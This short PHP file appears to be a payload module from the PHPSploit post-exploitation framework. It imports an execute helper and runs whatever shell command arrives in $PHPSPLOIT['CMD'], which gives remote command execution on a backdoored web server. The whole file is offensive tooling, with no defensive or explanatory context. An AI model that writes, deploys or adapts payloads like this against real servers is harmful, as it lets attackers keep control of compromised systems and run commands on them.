<?

!import(execute)

return @execute($PHPSPLOIT['CMD']);

?>
